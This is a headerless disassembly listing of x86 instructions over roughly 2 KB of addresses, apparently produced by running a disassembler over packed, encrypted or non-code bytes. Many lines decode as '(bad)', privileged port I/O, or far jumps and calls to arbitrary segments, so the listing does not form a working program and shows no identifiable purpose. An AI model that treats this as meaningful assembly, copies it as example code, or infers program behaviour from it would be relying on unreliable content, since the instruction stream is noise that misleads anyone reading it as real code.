  40eb27:	icebp  
  40eb28:	fldenv [ebx]
  40eb2a:	push   edx
  40eb2b:	jmp    DWORD PTR [edx-0x4bc70eb3]
  40eb31:	inc    esi
  40eb32:	(bad)  
  40eb33:	in     al,0xd4
  40eb35:	cwde   
  40eb36:	shl    DWORD PTR [esi],1
  40eb38:	aas    
  40eb39:	fild   WORD PTR [edi+0x73]
  40eb3c:	stos   BYTE PTR es:[edi],al
  40eb3d:	pusha  
  40eb3e:	aas    
  40eb3f:	xchg   ebx,eax
  40eb40:	test   DWORD PTR [ebp+0x35],esi
  40eb43:	test   bh,0x95
  40eb46:	mov    esp,0x32d79ef1
  40eb4b:	rcr    ah,0x55
  40eb4e:	shl    cl,1
  40eb50:	das    
  40eb51:	sbb    edx,DWORD PTR [edx]
  40eb53:	push   esi
  40eb54:	mov    DWORD PTR [ecx-0x2a],0x40a5fea3
  40eb5b:	adc    eax,0xfcf8b69d
  40eb60:	fcomi  st,st(1)
  40eb62:	fldpi  
  40eb64:	dec    esi
  40eb65:	les    eax,FWORD PTR [eax+0x6bebac8e]
  40eb6b:	sar    cl,cl
  40eb6d:	out    0xa9,al
  40eb6f:	in     al,0x3a
  40eb71:	fstp   TBYTE PTR [edx]
  40eb73:	in     eax,dx
  40eb74:	or     al,0xb8
  40eb76:	cdq    
  40eb77:	fs test eax,0x81a35201
  40eb7d:	fidiv  DWORD PTR [ecx-0x6c3dc7a3]
  40eb83:	mov    bl,0x6d
  40eb85:	adc    eax,0x997c1fe9
  40eb8a:	xchg   ebp,eax
  40eb8b:	mov    dl,0x95
  40eb8d:	pushf  
  40eb8e:	inc    eax
  40eb8f:	ret    
  40eb90:	jmp    0x9540f10d
  40eb95:	hlt    
  40eb96:	bound  edi,QWORD PTR [ebp+0xd]
  40eb99:	retf   
  40eb9a:	and    al,0x8e
  40eb9c:	sub    ecx,DWORD PTR [edx-0x3a]
  40eb9f:	fdiv   DWORD PTR [ebp-0x7e2f1947]
  40eba5:	addr16 jb 0x40ebb3
  40eba8:	popa   
  40eba9:	in     eax,dx
  40ebaa:	mov    al,ds:0xb600cf28
  40ebaf:	jo     0x40ebdc
  40ebb1:	ret    
  40ebb2:	call   FWORD PTR [ecx-0x34e5603f]
  40ebb8:	and    eax,0x123560f6
  40ebbd:	in     al,dx
  40ebbe:	pop    esi
  40ebbf:	inc    edi
  40ebc0:	sub    BYTE PTR [ecx+edx*2+0x4c87a3d9],dl
  40ebc7:	pop    ebp
  40ebc8:	in     al,0x9c
  40ebca:	mov    esp,0xc67d739c
  40ebcf:	call   0x6cc3ccf5
  40ebd4:	mov    al,0xc2
  40ebd6:	mov    gs,ebp
  40ebd8:	retf   
  40ebd9:	repnz xchg ebp,eax
  40ebdb:	pusha  
  40ebdc:	cld    
  40ebdd:	push   edi
  40ebde:	mov    al,ds:0x8c9d77de
  40ebe3:	jg     0x40ec0b
  40ebe5:	inc    edi
  40ebe6:	bound  eax,QWORD PTR [edi-0x671be00f]
  40ebec:	push   esi
  40ebed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebee:	push   edx
  40ebef:	bound  esp,QWORD PTR [esi]
  40ebf1:	(bad)  [ecx-0x3513c253]
  40ebf7:	mov    ds:0x4435c1d1,al
  40ebfc:	mov    ah,0xc6
  40ebfe:	not    BYTE PTR [edx]
  40ec00:	inc    eax
  40ec01:	jmp    0x81155c3e
  40ec06:	ret    0x8f2f
  40ec09:	out    dx,eax
  40ec0a:	pop    ecx
  40ec0b:	loop   0x40ec2e
  40ec0d:	pop    ss
  40ec0e:	mov    eax,0x4c7cd5a9
  40ec13:	loop   0x40ebd1
  40ec15:	xchg   ebp,eax
  40ec16:	push   cs
  40ec17:	fist   WORD PTR [ebp-0x80]
  40ec1a:	aas    
  40ec1b:	popf   
  40ec1c:	xchg   BYTE PTR [eax+0x99a286f],ah
  40ec22:	test   eax,0x95a3987d
  40ec27:	call   0x128acb7d
  40ec2c:	ss stos DWORD PTR es:[edi],eax
  40ec2e:	scas   al,BYTE PTR es:[edi]
  40ec2f:	inc    DWORD PTR [ebx+0x2d27e40c]
  40ec35:	dec    BYTE PTR [ecx+0x7215ccdc]
  40ec3b:	mov    WORD PTR [ebx],cs
  40ec3d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40ec3f:	scas   eax,DWORD PTR es:[edi]
  40ec40:	jno    0x40ecaf
  40ec42:	loopne 0x40ec1f
  40ec44:	ror    ch,cl
  40ec46:	bound  edi,QWORD PTR [edx-0x6e]
  40ec49:	dec    ecx
  40ec4a:	mov    al,ds:0xed690909
  40ec4f:	xor    al,0x59
  40ec51:	jb     0x40eca3
  40ec53:	rcl    DWORD PTR [ebx],0x9b
  40ec56:	xor    eax,0xea446f11
  40ec5b:	adc    ch,bl
  40ec5d:	xor    DWORD PTR [ebp-0x45b3c162],0x362d9fb4
  40ec67:	ror    BYTE PTR [ecx+eax*4+0x4e83bde5],0x6f
  40ec6f:	neg    DWORD PTR [ecx]
  40ec71:	xor    al,BYTE PTR [edx-0x5f]
  40ec74:	data16 fadd QWORD PTR [eax+0x54]
  40ec78:	shr    DWORD PTR [esi],1
  40ec7a:	adc    eax,0x98565a37
  40ec7f:	mov    bl,0x77
  40ec81:	mov    al,ds:0xc7c52173
  40ec86:	jle    0x40ecfa
  40ec88:	cmp    ecx,edx
  40ec8a:	cdq    
  40ec8b:	jae    0x40ec1e
  40ec8d:	daa    
  40ec8e:	and    esp,0xd26742c2
  40ec94:	sbb    DWORD PTR [edx],esp
  40ec96:	lods   eax,DWORD PTR ds:[esi]
  40ec97:	stc    
  40ec98:	cmp    eax,0x36415b6f
  40ec9d:	xchg   esi,eax
  40ec9e:	repnz cmp al,0x77
  40eca1:	jmp    0xbe46:0xd94ef17c
  40eca8:	mov    edi,0x1295d811
  40ecad:	jnp    0x40ec7b
  40ecaf:	xchg   ebx,eax
  40ecb0:	jns    0x40ec83
  40ecb2:	aas    
  40ecb3:	mov    ecx,0xe188be0b
  40ecb8:	ja     0x40eceb
  40ecba:	push   edi
  40ecbb:	or     al,0x4c
  40ecbd:	sar    BYTE PTR [esi],1
  40ecbf:	rcr    DWORD PTR [eax],0x99
  40ecc2:	cmp    BYTE PTR [ecx],ch
  40ecc4:	mov    bl,0x95
  40ecc6:	fs inc ebp
  40ecc8:	test   eax,0x418afd00
  40eccd:	bound  esi,QWORD PTR [edx-0xd]
  40ecd0:	test   eax,0xe447329b
  40ecd5:	ffreep st(6)
  40ecd7:	bound  esi,QWORD PTR [esi-0x25c0986a]
  40ecdd:	mov    bh,BYTE PTR [ebp+edi*4-0x6f377f2e]
  40ece4:	or     al,0xd9
  40ece6:	ja     0x40ecbd
  40ece8:	dec    edi
  40ece9:	push   ebx
  40ecea:	in     al,0x20
  40ecec:	rcr    edx,1
  40ecee:	xor    ecx,DWORD PTR [edi+0x63]
  40ecf1:	pop    ebx
  40ecf2:	inc    edi
  40ecf3:	adc    DWORD PTR [esp+ecx*4+0x76],ecx
  40ecf7:	out    dx,eax
  40ecf8:	(bad)  
  40ecf9:	repnz ins DWORD PTR es:[edi],dx
  40ecfb:	inc    esi
  40ecfc:	nop
  40ecfd:	daa    
  40ecfe:	imul   esp,DWORD PTR ds:0x8021fffe,0xe8b1a161
  40ed08:	jle    0x40eca2
  40ed0a:	mov    BYTE PTR [edi],dl
  40ed0c:	(bad)  
  40ed0d:	js     0x40eca7
  40ed0f:	daa    
  40ed10:	pop    ebx
  40ed11:	jno    0x40ed8e
  40ed13:	fiadd  DWORD PTR cs:[ecx+0x16]
  40ed17:	imul   edx,DWORD PTR [esi+0x18496f46],0xfffffffb
  40ed1e:	push   0xffffffdb
  40ed20:	cli    
  40ed21:	test   esi,esp
  40ed23:	cwde   
  40ed24:	lods   al,BYTE PTR ds:[esi]
  40ed25:	lahf   
  40ed26:	cmc    
  40ed27:	not    BYTE PTR [ebp+0x6968027c]
  40ed2d:	sub    DWORD PTR [edx-0xc7df137],edi
  40ed33:	test   eax,0x6fb9ad5a
  40ed38:	pop    ecx
  40ed39:	xor    edx,DWORD PTR ds:0xe598590e
  40ed3f:	popa   
  40ed40:	fwait
  40ed41:	sub    eax,0xdfd9fc93
  40ed46:	add    ebx,DWORD PTR [ebp-0x2a]
  40ed49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed4a:	push   edx
  40ed4b:	sub    cl,BYTE PTR [ebp+0x19a34527]
  40ed51:	jne    0x40ed44
  40ed53:	sub    eax,0x135739fd
  40ed58:	jp     0x40ed49
  40ed5a:	loopne 0x40ed6a
  40ed5c:	imul   ebp,esp,0x308717ee
  40ed62:	pushf  
  40ed63:	retf   0xf026
  40ed66:	sbb    dh,BYTE PTR [edx+0x5fdf22d8]
  40ed6c:	aaa    
  40ed6d:	pop    esi
  40ed6e:	pop    esp
  40ed6f:	adc    DWORD PTR [eax+0x8],ebx
  40ed72:	mov    ds:0x8355da5d,al
  40ed77:	rcr    DWORD PTR [ebx+0x44],0xae
  40ed7b:	add    al,ch
  40ed7d:	retf   
  40ed7e:	or     DWORD PTR [ebp-0x74],0x2a3d6213
  40ed85:	mov    al,ds:0xee86dde9
  40ed8a:	div    DWORD PTR [eax]
  40ed8c:	shl    DWORD PTR [ebp+ecx*2-0xdc72678],0xee
  40ed94:	inc    ebx
  40ed95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed96:	in     al,0x64
  40ed98:	xor    eax,0x241bc33f
  40ed9d:	stc    
  40ed9e:	sti    
  40ed9f:	fidivr DWORD PTR [esi-0x387a42c5]
  40eda5:	call   0x817a:0xf9d5feb4
  40edac:	fadd   QWORD PTR [edi+0x1e]
  40edaf:	sti    
  40edb0:	lock mov ebx,edx
  40edb3:	sub    ebp,edi
  40edb5:	xchg   ah,dl
  40edb7:	data16 sbb dl,dh
  40edba:	sbb    BYTE PTR [eax-0x31],dh
  40edbd:	sbb    DWORD PTR [ebx+0x5f4f40dc],esi
  40edc3:	iret   
  40edc4:	rol    cl,1
  40edc6:	ja     0x40edd4
  40edc8:	clc    
  40edc9:	retf   
  40edca:	popf   
  40edcb:	ins    DWORD PTR es:[edi],dx
  40edcc:	loopne 0x40edd3
  40edce:	jno    0x40ee03
  40edd0:	aaa    
  40edd1:	mov    ecx,0x83c0e2ac
  40edd6:	xlat   BYTE PTR ds:[ebx]
  40edd7:	jmp    0x40ee21
  40edd9:	xchg   ecx,eax
  40edda:	leave  
  40eddb:	jp     0x40ee0c
  40eddd:	popa   
  40edde:	out    dx,eax
  40eddf:	rol    ah,0x90
  40ede2:	stos   BYTE PTR es:[edi],al
  40ede3:	cmp    DWORD PTR [eax+0x4109a4d4],ebp
  40ede9:	mov    bh,0x6b
  40edeb:	inc    ebx
  40edec:	bound  ebx,QWORD PTR [ebx+0x34]
  40edef:	jl     0x40ed7a
  40edf1:	fiadd  WORD PTR [edx+0x54]
  40edf4:	push   0x7b35aa06
  40edf9:	sar    BYTE PTR [esi],1
  40edfb:	sti    
  40edfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edfd:	mov    eax,ds:0x17de7c42
  40ee02:	das    
  40ee03:	out    dx,eax
  40ee04:	in     eax,dx
  40ee05:	sub    cl,dl
  40ee07:	mov    edi,esi
  40ee09:	push   ebx
  40ee0a:	and    DWORD PTR [edi-0x435397cb],ebx
  40ee10:	icebp  
  40ee11:	jo     0x40ee1c
  40ee13:	cmc    
  40ee14:	imul   edx,DWORD PTR [ecx-0x38],0xffffff84
  40ee18:	dec    esp
  40ee19:	push   DWORD PTR [eax+0x5b076c22]
  40ee1f:	outs   dx,DWORD PTR ds:[esi]
  40ee20:	pop    ecx
  40ee21:	fwait
  40ee22:	jbe    0x40ee2f
  40ee24:	add    al,0xcb
  40ee26:	mov    bh,0x17
  40ee28:	cmp    bl,0xcb
  40ee2b:	pop    esi
  40ee2c:	mov    es,WORD PTR [ebp-0x7]
  40ee2f:	and    al,0x34
  40ee31:	stos   DWORD PTR es:[edi],eax
  40ee32:	icebp  
  40ee33:	or     DWORD PTR [eax+0x216949d4],edx
  40ee39:	lods   eax,DWORD PTR ds:[si]
  40ee3b:	inc    esi
  40ee3c:	retf   
  40ee3d:	push   edi
  40ee3e:	hlt    
  40ee3f:	push   esi
  40ee40:	(bad)  
  40ee41:	adc    DWORD PTR [esi+0x5],edi
  40ee44:	inc    eax
  40ee45:	cmp    ah,BYTE PTR [esi+0x4222a212]
  40ee4b:	push   ss
  40ee4c:	aad    0x61
  40ee4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee4f:	adc    eax,DWORD PTR [esi-0x6e973fd1]
  40ee55:	lods   al,BYTE PTR ds:[esi]
  40ee56:	xor    al,0x74
  40ee58:	shl    BYTE PTR [edx],cl
  40ee5a:	sbb    BYTE PTR [ebx+ecx*1-0x4d398366],ch
  40ee61:	inc    ebx
  40ee62:	inc    eax
  40ee63:	xlat   BYTE PTR ds:[ebx]
  40ee64:	leave  
  40ee65:	enter  0x1537,0x45
  40ee69:	outs   dx,DWORD PTR ds:[esi]
  40ee6a:	sbb    DWORD PTR [edx-0x74],0xc3353b9f
  40ee71:	or     BYTE PTR [edx+0x60196e39],ch
  40ee77:	fwait
  40ee78:	mov    al,ds:0x1aff199c
  40ee7d:	je     0x40ee3f
  40ee7f:	mov    ds:0xefd79283,eax
  40ee84:	jge    0x40eeea
  40ee86:	inc    edx
  40ee87:	and    DWORD PTR [esi-0x60],edi
  40ee8a:	dec    esi
  40ee8b:	and    bh,dl
  40ee8d:	pop    ds
  40ee8e:	sti    
  40ee8f:	or     eax,0x2783be3d
  40ee94:	cmp    ah,dh
  40ee96:	pop    esi
  40ee97:	(bad)  
  40ee99:	les    ebx,FWORD PTR [ebp+0x5f]
  40ee9c:	test   al,0x11
  40ee9e:	push   ecx
  40ee9f:	cli    
  40eea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eea1:	xchg   esp,eax
  40eea2:	mov    ebx,0x2285840f
  40eea7:	mov    ebx,0xea3efd6f
  40eeac:	bound  ebp,QWORD PTR [edi-0xa]
  40eeaf:	mov    bl,0x94
  40eeb1:	xor    eax,0x1a031ea6
  40eeb6:	enter  0x83c2,0xb5
  40eeba:	push   esp
  40eebb:	mov    al,0x6e
  40eebd:	pop    edx
  40eebe:	jl     0x40ee54
  40eec0:	dec    esi
  40eec1:	mov    edi,ebp
  40eec3:	dec    edx
  40eec4:	xor    ebp,DWORD PTR [eax]
  40eec6:	jmp    0xc670:0x86ef53f5
  40eecd:	aam    0x82
  40eecf:	jge    0x40ef0e
  40eed1:	xchg   di,ax
  40eed3:	mov    eax,ds:0xcab26701
  40eed8:	sti    
  40eed9:	sbb    eax,0x72c4afbf
  40eede:	pop    ss
  40eedf:	shr    DWORD PTR [ecx+ecx*2-0x5a63b81f],0x81
  40eee7:	adc    ebx,DWORD PTR [ecx]
  40eee9:	sti    
  40eeea:	lods   al,BYTE PTR ds:[esi]
  40eeeb:	cmp    eax,esp
  40eeed:	pop    edi
  40eeee:	call   0xe631c757
  40eef3:	repnz in al,0xab
  40eef6:	add    di,WORD PTR [ecx+0x76]
  40eefa:	icebp  
  40eefb:	mov    al,ds:0x41e31316
  40ef00:	xor    al,0x7e
  40ef02:	jbe    0x40eed7
  40ef04:	in     eax,0xf
  40ef06:	xchg   edi,eax
  40ef07:	mov    al,ds:0xb48fed64
  40ef0c:	jmp    0x5798:0xcb18fbf3
  40ef13:	dec    ebx
  40ef14:	or     esi,DWORD PTR [esi-0x7d]
  40ef17:	push   ss
  40ef18:	jg     0x40ef4a
  40ef1a:	jo     0x40ef98
  40ef1c:	rcl    edx,cl
  40ef1e:	mov    ebx,0x8870cdc3
  40ef23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef24:	(bad)  
  40ef26:	repz mov ebp,edi
  40ef29:	or     al,0xa1
  40ef2b:	mov    cl,BYTE PTR [esp+ecx*2]
  40ef2e:	add    BYTE PTR [ebx+0x57],0xc4
  40ef32:	mov    edi,0x2a8a6e44
  40ef37:	add    eax,0x3a4fec43
  40ef3c:	call   0x3418:0xf89f7546
  40ef43:	mov    gs,WORD PTR [eax-0xf8f1b3f]
  40ef49:	xor    esp,DWORD PTR [ebp+edi*8+0x4d]
  40ef4d:	lds    ebp,FWORD PTR [eax-0x773e488e]
  40ef53:	pop    esi
  40ef54:	cmp    dh,BYTE PTR [eax+0x7c]
  40ef57:	test   BYTE PTR [esi-0x61],bh
  40ef5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef5b:	xchg   esp,eax
  40ef5c:	add    eax,0xe753ea42
  40ef61:	rol    dl,cl
  40ef63:	adc    BYTE PTR [ebx+0x4325fee5],cl
  40ef69:	mov    esp,0xe72b0338
  40ef6e:	jns    0x40efee
  40ef70:	adc    BYTE PTR [eax+0x77f6cf1e],al
  40ef76:	repz ficomp DWORD PTR [bp+di-0x3f7e]
  40ef7c:	(bad)  [ebp+0x335c42bc]
  40ef82:	and    DWORD PTR [ebp-0x6f],edi
  40ef85:	dec    ebp
  40ef86:	outs   dx,BYTE PTR ds:[esi]
  40ef87:	in     eax,0xb6
  40ef89:	icebp  
  40ef8a:	mov    eax,0x52c160b
  40ef8f:	push   es
  40ef90:	sub    ebx,DWORD PTR [eax-0x39]
  40ef93:	fimul  WORD PTR [ecx]
  40ef95:	jmp    0x6f80f483
  40ef9a:	sti    
  40ef9b:	lock ds pop esi
  40ef9e:	push   edx
  40ef9f:	lods   al,BYTE PTR ds:[esi]
  40efa0:	inc    edi
  40efa1:	xor    eax,0x67a24b68
  40efa6:	push   eax
  40efa7:	pop    edx
  40efa8:	mov    dl,0xe4
  40efaa:	es inc eax
  40efac:	repz bound ebp,QWORD PTR [eax+0x58f65396]
  40efb3:	(bad)  
  40efb4:	out    0xf4,eax
  40efb6:	call   0xbce23f15
  40efbb:	sbb    al,0xf3
  40efbd:	nop
  40efbe:	(bad)  
  40efbf:	sub    eax,0x5583aeee
  40efc4:	cmc    
  40efc5:	sbb    BYTE PTR [ecx],0xf6
  40efc8:	(bad)
  40efcd:	jge    0x40efdc
  40efcf:	bound  ebx,QWORD PTR [edx]
  40efd1:	loopne 0x40f027
  40efd3:	test   DWORD PTR [eax+edi*1],ecx
  40efd6:	xchg   edi,eax
  40efd7:	(bad)  
  40efd8:	lods   eax,DWORD PTR ds:[esi]
  40efd9:	mov    ebp,0xf2457f50
  40efde:	fsub   QWORD PTR [esi-0x57ac1dee]
  40efe4:	push   ecx
  40efe5:	xor    DWORD PTR [ebp+0x46],0xd24d1416
  40efec:	dec    edx
  40efed:	adc    al,BYTE PTR [edx+0x5f]
  40eff0:	(bad)  
  40eff1:	fstp   st(6)
  40eff3:	cs call 0x8be5a171
  40eff9:	daa    
  40effa:	in     al,dx
  40effb:	aam    0xd9
  40effd:	push   esi
  40effe:	sahf   
  40efff:	int    0xb
  40f001:	out    0x31,al
  40f003:	popf   
  40f004:	push   es
  40f005:	shl    DWORD PTR [ebp-0x6a],0x2f
  40f009:	test   DWORD PTR [edx+0x44b6cc4a],0xc18ba50
  40f013:	je     0x40f00e
  40f015:	inc    eax
  40f016:	xor    al,0xf0
  40f018:	retf   
  40f019:	sbb    al,0x5c
  40f01b:	jnp    0x40efb0
  40f01d:	inc    ecx
  40f01e:	(bad)  
  40f01f:	sbb    esp,esp
  40f021:	scas   al,BYTE PTR es:[edi]
  40f022:	xchg   esi,eax
  40f023:	mov    BYTE PTR [esi],dl
  40f025:	push   es
  40f026:	mov    dh,0x98
  40f028:	data16 fwait
  40f02a:	dec    ebx
  40f02b:	lods   eax,DWORD PTR ds:[esi]
  40f02c:	or     eax,esi
  40f02e:	addr16 call 0x9261bd9c
  40f034:	push   ss
  40f035:	mov    dh,0xf0
  40f037:	mov    BYTE PTR [esi-0x41],bl
  40f03a:	push   es
  40f03b:	stc    
  40f03c:	mov    ch,0x6
  40f03e:	cmc    
  40f03f:	leave  
  40f040:	or     eax,0x38bcacbe
  40f045:	jl     0x40f0b3
  40f047:	inc    esp
  40f048:	push   ebp
  40f049:	retf   0xe3d4
  40f04c:	jl     0x40efd3
  40f04e:	outs   dx,DWORD PTR ds:[esi]
  40f04f:	lock (bad) 
  40f051:	daa    
  40f052:	popf   
  40f053:	test   BYTE PTR [eax-0x567a2218],bl
  40f059:	cli    
  40f05a:	jp     0x40f0bc
  40f05c:	ret    0x3b26
  40f05f:	sub    al,0xa8
  40f061:	sbb    al,0xb7
  40f063:	je     0x40f037
  40f065:	stc    
  40f066:	jns    0x40f007
  40f068:	pop    edx
  40f069:	idiv   bl
  40f06b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f06c:	or     DWORD PTR [edx+0x461b8b08],esi
  40f072:	inc    edx
  40f073:	push   edx
  40f074:	jle    0x40eff9
  40f076:	stos   BYTE PTR es:[edi],al
  40f077:	repz adc edx,ebp
  40f07a:	push   ecx
  40f07b:	dec    ebp
  40f07c:	xchg   esp,eax
  40f07d:	shl    BYTE PTR [ebp+0x33],1
  40f080:	in     eax,0x83
  40f082:	rcr    cl,0xb5
  40f085:	jns    0x40f0c2
  40f087:	mov    ebx,0x6ec68e42
  40f08c:	or     ebp,DWORD PTR [edi+0x6fb428ef]
  40f092:	mov    edi,0x3885c42c
  40f097:	add    bh,BYTE PTR [esi+0x55]
  40f09a:	sahf   
  40f09b:	adc    DWORD PTR [ecx-0xe],ebx
  40f09e:	retf   0xb733
  40f0a1:	test   al,0x64
  40f0a3:	clc    
  40f0a4:	lds    ebp,FWORD PTR [eax+0x26]
  40f0a7:	mov    bl,0xc
  40f0a9:	jno    0x40f0d6
  40f0ab:	and    al,0x4e
  40f0ad:	jae    0x40f0c6
  40f0af:	es stos BYTE PTR es:[edi],al
  40f0b1:	mov    edx,0xaeef9f7b
  40f0b6:	es push 0x227be968
  40f0bc:	rol    BYTE PTR [esp+ebx*2+0xc],0x4b
  40f0c1:	cmc    
  40f0c2:	ror    DWORD PTR [edx+0x505162e5],1
  40f0c8:	sbb    eax,0x7bbc1e3d
  40f0cd:	loopne 0x40f105
  40f0cf:	ins    DWORD PTR es:[edi],dx
  40f0d0:	mov    ch,0x93
  40f0d2:	mov    edx,0x1e9230c3
  40f0d7:	ins    DWORD PTR es:[edi],dx
  40f0d8:	xlat   BYTE PTR ds:[ebx]
  40f0d9:	and    dl,BYTE PTR [ebx+0x30]
  40f0dc:	xor    BYTE PTR [esi+0x19],dh
  40f0df:	mov    dh,BYTE PTR [edi-0x21]
  40f0e2:	mov    ds:0xfd821e0f,al
  40f0e7:	(bad)  
  40f0e9:	imul   ebp,DWORD PTR [edi],0x39a4aff0
  40f0ef:	sbb    eax,0x742efea4
  40f0f4:	add    al,al
  40f0f6:	sub    al,BYTE PTR [ecx-0x5d]
  40f0f9:	std    
  40f0fa:	outs   dx,DWORD PTR ds:[esi]
  40f0fb:	in     al,dx
  40f0fc:	ds jmp 0xfc74:0xc1eefb3f
  40f104:	bound  esp,QWORD PTR [edi]
  40f106:	mov    dh,0xcf
  40f108:	mov    eax,ds:0xc55c8d
  40f10d:	out    dx,al
  40f10e:	mov    edx,esp
  40f110:	popa   
  40f111:	push   ss
  40f112:	adc    al,0x39
  40f114:	pop    esp
  40f115:	inc    esp
  40f116:	xlat   BYTE PTR ds:[ebx]
  40f117:	inc    edx
  40f118:	imul   ebp,DWORD PTR [esi-0x70],0x1be59fb6
  40f11f:	mov    WORD PTR [esi],cs
  40f121:	daa    
  40f122:	or     ecx,ebx
  40f124:	cmp    eax,0x77b441e4
  40f129:	sti    
  40f12a:	cmp    dh,dl
  40f12c:	mov    WORD PTR [eax+0x1a2925d5],ss
  40f132:	stos   BYTE PTR es:[edi],al
  40f133:	int    0x97
  40f135:	xchg   edx,eax
  40f136:	aad    0x2a
  40f138:	in     al,0x84
  40f13a:	imul   ecx,DWORD PTR [eax],0xffffffbd
  40f13d:	and    BYTE PTR [esi+eiz*8+0x14],ch
  40f141:	iret   
  40f142:	lds    edx,FWORD PTR gs:[ebx-0x77e0f14]
  40f149:	cmp    eax,0xeb2461e3
  40f14e:	push   esp
  40f14f:	push   ebp
  40f150:	or     dh,BYTE PTR [ebx]
  40f152:	in     eax,dx
  40f153:	mov    ecx,0x28982693
  40f158:	mov    ah,0xb
  40f15a:	test   DWORD PTR ds:0x1c7ca448,0xae8c2ee8
  40f164:	xor    DWORD PTR [ecx],ecx
  40f166:	sbb    BYTE PTR [esi-0x767d213c],bl
  40f16c:	xor    ah,dl
  40f16e:	int3   
  40f16f:	out    0x6c,al
  40f171:	lds    esi,FWORD PTR [esi-0x79bd958]
  40f177:	dec    edx
  40f178:	xchg   esi,eax
  40f179:	shl    DWORD PTR [ebp-0x21bbb914],cl
  40f17f:	fdiv   DWORD PTR [ebp-0x25cda65e]
  40f185:	sub    ebx,DWORD PTR [ebx+0x25]
  40f188:	mov    ebp,0x143fd44b
  40f18d:	bound  ebx,QWORD PTR [edx]
  40f18f:	ins    DWORD PTR es:[edi],dx
  40f190:	shl    BYTE PTR [ebx-0x57],cl
  40f193:	fldcw  WORD PTR [eiz*1-0x753ec80]
  40f19a:	scas   eax,DWORD PTR es:[edi]
  40f19b:	mov    ebp,0x130056a4
  40f1a0:	aas    
  40f1a1:	leave  
  40f1a2:	and    esp,esi
  40f1a4:	sahf   
  40f1a5:	lock and DWORD PTR ds:[esi-0x10],eax
  40f1aa:	sahf   
  40f1ab:	jle    0x40f138
  40f1ad:	push   edi
  40f1ae:	mov    ch,0x72
  40f1b0:	retf   
  40f1b1:	idiv   BYTE PTR [ecx]
  40f1b3:	cmp    DWORD PTR [eax-0x10],ebp
  40f1b6:	dec    ebp
  40f1b7:	hlt    
  40f1b8:	jae    0x40f20f
  40f1ba:	mov    edx,0x9d946e3c
  40f1c0:	enter  0x25ad,0x84
  40f1c4:	push   0xfffffff7
  40f1c6:	push   edi
  40f1c7:	jp     0x40f224
  40f1c9:	push   0x7fb8e25
  40f1ce:	stc    
  40f1cf:	push   ebx
  40f1d0:	arpl   sp,si
  40f1d2:	push   ecx
  40f1d3:	shl    BYTE PTR [ebp-0x21],cl
  40f1d6:	(bad)  [esi]
  40f1d8:	mov    dh,ch
  40f1da:	cmp    edx,ebp
  40f1dc:	dec    edi
  40f1dd:	stc    
  40f1de:	or     DWORD PTR [ebp-0x38cb2b03],0xffffffc4
  40f1e5:	call   0x7ea0:0x3d4b2b49
  40f1ec:	call   0xbbee5e54
  40f1f1:	or     al,dh
  40f1f3:	stc    
  40f1f4:	adc    eax,0x2f202314
  40f1f9:	fistp  DWORD PTR [esi+0x68]
  40f1fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1fd:	xor    BYTE PTR [edi+eax*4+0x656c54d9],al
  40f204:	into   
  40f205:	add    ah,BYTE PTR [esi]
  40f207:	xchg   edi,eax
  40f208:	imul   esp,DWORD PTR [edi+0x5b],0x1621cf13
  40f20f:	and    eax,0xc0532fd1
  40f214:	xor    BYTE PTR [eax-0x1d],bh
  40f217:	add    eax,0xa52364a7
  40f21c:	cwde   
  40f21d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f21e:	pop    esi
  40f21f:	enter  0x777c,0x25
  40f223:	push   0x1e
  40f225:	loope  0x40f265
  40f227:	xchg   dh,ah
  40f229:	adc    eax,0x7e93aacb
  40f22e:	aaa    
  40f22f:	pop    ecx
  40f230:	push   cs
  40f231:	and    DWORD PTR [ecx],0x8ced775c
  40f237:	push   eax
  40f238:	push   es
  40f239:	lock int 0x1d
  40f23c:	lds    ebp,FWORD PTR [ecx+0x45]
  40f23f:	cmp    eax,0x7cdddc8e
  40f244:	outs   dx,DWORD PTR ds:[esi]
  40f245:	mov    al,ds:0xdc1d74b4
  40f24a:	mov    ds,WORD PTR [edx-0x5a]
  40f24d:	inc    esi
  40f24e:	mov    ecx,DWORD PTR [ebx+0x31]
  40f251:	cmp    esp,DWORD PTR [esi+0x3501417c]
  40f257:	jno    0x40f2ba
  40f259:	lds    edi,FWORD PTR [eax]
  40f25b:	aas    
  40f25c:	sbb    bh,dl
  40f25e:	sub    dl,dh
  40f260:	pushf  
  40f261:	push   ecx
  40f262:	in     al,dx
  40f263:	imul   ecx,edi,0x55e89b2a
  40f269:	js     0x40f267
  40f26b:	iret   
  40f26c:	inc    esi
  40f26d:	mov    ch,0x3e
  40f26f:	push   ecx
  40f270:	rol    eax,0x42
  40f273:	repz push es
  40f275:	inc    esp
  40f276:	dec    edx
  40f277:	sar    DWORD PTR [edi],1
  40f279:	inc    esi
  40f27a:	(bad)  [edi+0x474ee355]
  40f280:	imul   edi,DWORD PTR [eax],0x7b
  40f283:	lahf   
  40f284:	shl    esp,cl
  40f286:	arpl   WORD PTR [esi-0x436701e7],dx
  40f28c:	xchg   edx,eax
  40f28d:	mov    ds:0x716941c0,al
  40f292:	rcl    ecx,1
  40f294:	xor    al,0xdd
  40f296:	sub    eax,0xfa6e86ac
  40f29b:	xchg   ebx,eax
  40f29c:	add    BYTE PTR [eax-0x7e97f67f],0xc6
  40f2a3:	cli    
  40f2a4:	sbb    eax,0xbab9a264
  40f2a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2aa:	lock ins DWORD PTR es:[edi],dx
  40f2ac:	mov    eax,0xeb8d4996
  40f2b1:	repz out 0x74,eax
  40f2b4:	mov    BYTE PTR [edi-0x30ec0a49],ch
  40f2ba:	loope  0x40f297
  40f2bc:	jmp    0x25a3:0xd2b18660
  40f2c3:	popf   
  40f2c4:	daa    
  40f2c5:	xchg   esp,eax
  40f2c6:	into   
  40f2c7:	sti    
  40f2c8:	mov    edi,ecx
